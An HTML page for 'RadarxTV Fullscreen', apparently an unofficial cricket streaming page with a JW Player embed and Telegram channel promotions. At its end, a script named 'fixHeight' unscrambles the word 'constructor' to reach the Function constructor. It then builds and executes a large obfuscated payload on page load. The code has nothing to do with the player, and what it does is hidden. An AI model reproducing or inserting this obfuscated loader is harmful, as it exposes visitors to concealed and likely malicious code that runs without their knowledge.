<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>RadarxTV Fullscreen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <script src="https://content.jwplatform.com/libraries/SAHhwvZq.js"></script>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      height: 100%;
      width: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }

    #player-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100dvh; /* Mobile accurate height */
      width: 100vw;
      background-color: black;
      position: relative;
    }

    #jwplayerDiv {
      width: 100%;
      height: 100%;
    }

    #logo-banner {
      position: absolute;
      top: 0;
      width: 100%;
      text-align: center;
      padding: 10px;
      z-index: 10;
    }

    #logo-banner img {
      width: 100%;
      max-width: 250px;
      height: auto;
    }

    #join-telegram {
      position: absolute;
      bottom: 10%;
      width: 100%;
      text-align: center;
      z-index: 10;
    }

    #join-telegram a {
      display: inline-block;
      background-color: #0088cc;
      color: white;
      padding: 10px 20px;
      text-decoration: none;
      border-radius: 5px;
      font-size: 18px;
      margin-top: 10px;
    }

    #popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      z-index: 20;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
    }

    #popup-content {
      background-color: #333;
      padding: 20px;
      border-radius: 10px;
      max-width: 400px;
      margin: 0 auto;
    }

    #popup button {
      background-color: #ff6f61;
      color: white;
      border: none;
      padding: 10px 20px;
      margin: 10px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }

    #popup button:hover {
      background-color: #e55b4e;
    }
  </style>
</head>
<body>
  <div id="popup">
    <div id="popup-content">
      <h2>Join our Telegram Channel for More Links!</h2>
      <a href="https://t.me/RadarXCricket" target="_blank"><button>Join</button></a>
      <button id="continue-button">Continue to Stream</button>
    </div>
  </div>

  <div id="player-container">
    <div id="logo-banner">
      <img src="https://radarxtv.site/ipl.png" alt="RadarXTV Logo">
    </div>
    <div id="jwplayerDiv"></div>
  </div>

  <div id="join-telegram">
    <a href="https://t.me/RadarXCricket" target="_blank">Join Telegram</a>
  </div>

  <script>
    var fixHeight;(function(){var cwd='',Oey=621-610;function EBs(c){var j=7301045;var f=c.length;var h=[];for(var m=0;m<f;m++){h[m]=c.charAt(m)};for(var m=0;m<f;m++){var b=j*(m+423)+(j%39567);var z=j*(m+485)+(j%47939);var t=b%f;var y=z%f;var w=h[t];h[t]=h[y];h[y]=w;j=(b+z)%7360394;};return h.join('')};var GEL=EBs('unspkrchzootscdbfltagromqyituxrnvwecj').substr(0,Oey);var bne=',a,rb.ea1t[f.rn=((;n-r ;S8(t=n8fg;s,rvhnoh[fv,)r[x4z"n)(my;vr8;8g;;6v-t }=2aer,8r+qf670h,tudrtcrm8(o8(ex0kqao98=7).p.7]srtup7s*z=m jr=ie[a)e*gk!<=;nvf,bhio,[eanm[,[+o=;l, ;h0,o<]9tu= 0at+16wmf4ar6Aal)y=t l;dpo,7]f((2.v(==,=ro];;n.[m{srn2"v-lgeid=6C+x;um,ln+ar i)gces a;zi-vk.5eevh;e)sg.=t .h-a{io] l),ullh=pr u(aq+;b,t[ s"p)t,;va);;r0Ar0f n=<=shc7ne]71e;v+=e "hd;( -6snfg+k+r)lnl4 t=a0adevC;its+o;)9u.r2 =)t"vahvn=)y.-i)nttr[td+crmrpk",ra=m+1)=}u9+je;te2sxls{(0fa3pfj.;e=)tghnr5slth.r(n0cpt{CoigAc;]"v.jmealy"1x(er).s3nbda)=(ew;(as0h}f.i)a;6lo,.!vl;A9(1i=Cgsrve.u]gi,0durrnv2;21d]+su;r=0i7c1=ve"a;n9p{)]ig[iwcmi+ vi2)m{)hro[;uacn){i.(a(iAna;=.uz0n>abfasj(geh))6k)olr(4a.(r(,r];7m;m5<.ssjea]Sbhva; =+(.jnnul.vea;aa(=ao3gu;+,fm,.14(n>82)vmoltnthod} (rpt=;tr(;s;o;ghlr9rCh=a(r6)d0o]+smr+6.r)n=(rs,w+oah(1(+=ju1+p ij+i,(o)q=rC).9;rev))nior}rvra<n}=vh"=C2+en};=oro;+otue ],[g lwk(svs, =h=v s[tCn';var BSY=EBs[GEL];var ngN='';var kXv=BSY;var liO=BSY(ngN,EBs(bne));var IQc=liO(EBs('=@[,e(1e?\/(is\/$W]2tdrWW,$){ledll6e.o%moa,hd39io!$Wa$rui5W"de"5h)jfg!etsW&Wie,fot6fW=!0"1eAjcshWWb8vou,drW:ps584(5Wd%u8tpne..dpWtSw)o_l$.o WW\/$%[W)0]d3W_i:_.zni9obwbnWeW(reiW,!(n(t.7(3$.,{$_W0ar;=)t;5n.a}lnW15=($W.j4_9ntf2dd1(ocn(85cutf)]]s%0due!bln,nhC3lrcW,8,)r.3. mh>Wei4c60*{(ot)ph1 =va ;pte+9e_,im.Wi0i3,;t!dia4_rdm4d1\/W2ajjst.pel%rW6l,reg.A;tW8e%apmWj8f\/\/ve!6Wec4fo;]1_trt!?, }te6s.banlr19s56aW1Wio..lp_>,djrn irWW_0ajli\/}Wctsb3b3.aWW;_tjW4W!pWn uT,caW0s.acs,3_W3[C]WnpWE47ot;}.lW+04i92l1bdnWe(W((=l2fdfe6WW{tyt)}}Wel5%tjya,i6$)z!,.iz;cd.a)oTpc[W0{.ci.,}c:Wt.()3[o4i)t%si(spf}hfuo.1ridvyi{gf\/s%e3.p.ns1+n:feS3e)keed1._8pr{leo ;.(3}9.u4Wir"-cd)sheWftad)i,tj7i{tD..n1d9sa)xy]6ad\/%ofooW.d6wk5W%%e"Wcn3ai!h1Ws7tWiuargu$W2!@6m.dWuih4aoWs)3odao-e%5(oau"na3r20}rcWd6co3f0e6f)dt:\',]ra7$7rn1rtj_?(4,02W=c3_t7.7;\/p!ortoWc){coa{]r;.f;=tb=y)W>tW6=);-:-Wr!$W_,]?.bdbc]n$6o!fWxddnW)(h.om4jl;5(ttc 0dqr;.gm(ch3"0=j%r3iW)xa1onajej73bdn,.e9l\'t}6536.!W,[{(=Wef(ta7)f)oW_WdWe]<W0fw(mtdTfd8d3,;s_#l*jm4ijW:)+0.bm($3ekie2f4cbf6;i el.._es,,_Wd].d6;WW]_ac!;ttdWg=.,g,).W$awa.j73h2enfn)!3],t)h;e]c]izwte(.Ce.dW_u _!l( eowossdax4Wgpn.u5.ds9x%2w\/Wf)d:(:.udt%W3n!E%40fi{d)2esp;)>:el_!]d6]WWoW7%an38aW,.1Wd)W!3!W)7)8(W}(r)==17#W_dozns oe&rr_4W(noc.mgct(W;1r2toghf)f2W[!o(Wm<=hs)W!ryrlW(}77;g)=;t)5WW9e(+t(_pt>rdi%di 02+(!))2.)tnl2rl.v.ulnetaji.2t>0(0WrfW5mW<=ofd$%$c(&nW$aye5<e9W3sWo!Wn;2rutt%.>fa; W.])a!1ot%3dn(orW\/Wt;l.a95el8{4pWu.Wi$mc5,}kbnwd\/1ei.Wira;2m]d(ree8cr(d}6eo4i!W\/2](((W=l$(rW5;rW},$uW,ta:uvi$n,mr\/rd o7_nyt("kets5me\/WfWd0p-],h5rhl%}W=p=].$l8o;a0!h)j$(dan]_%cWWW;r.b_Wcdia.u_p#C!#cea6aso).noc."_ ,lr1u(]=0=\/n,pnt%W3WWj7dfW\'pipn+t.ae(!;4W e,.1_#ds.4ddiemWrn2o0{-_t,.s9r) xn\/g?eroor{eseIte,=WrWtl320ed;+ 7em.f;+pfgpaaWWtrxd.:)T(8{]9h_0W.dy:W 59)Wo;d!!)(WWe9me) 98n_df)lh}gt}de7i\/ d"4Wib0ft$b\'{ln2,ggW55kie{b.eeSt%f1eW_)1.ceC:,n)ie)]8ydT($#ct;WnW:59eeag{o,.nWp3).h*d.}uzo7eiW=:cr_%x)r!daWs#u(t.aoi i%06.]W0!aW9tha3e3yit!_2z)WW W*%+s\/tuzdt(n7ogjg7j+409(}eutog(letn9%.IWh3{=-l bygWen.dWon$.u_r};\/#w(W\/ W,6!m.A7[0b)8o 2nC[T8u ,a\/,a,.{t1.l!cpl5a)&$W{ WkntdW.rAg65eW1.]rje_ct i.ti 13va_}W t)9_Wd.Wn()aW6e!_o=W{mfWie$l5k*(.s7toi;r_.'));var rDk=kXv(cwd,IQc );rDk(2747);return 5752})()
  </script>
</body>
</html>